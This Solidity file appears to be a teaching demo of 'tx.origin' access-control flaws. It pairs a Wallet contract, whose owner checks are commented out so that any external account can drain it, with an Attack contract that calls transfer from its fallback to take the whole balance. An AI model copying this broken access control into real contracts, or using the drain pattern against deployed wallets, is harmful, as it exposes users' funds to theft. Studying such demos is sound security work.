// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address to, uint256 amount) public {
        // require(tx.origin == owner, "Only owner!");
        require(msg.sender == tx.origin, "Only EOA account");
        // require(msg.sender == owner, "only owner!");

        (bool sent, ) = payable(to).call{value: amount}("");

        require(sent, "Fail to send Ether");
    }
}





















contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

    fallback() external payable {
        attack();
    }

    receive() external payable {}
}

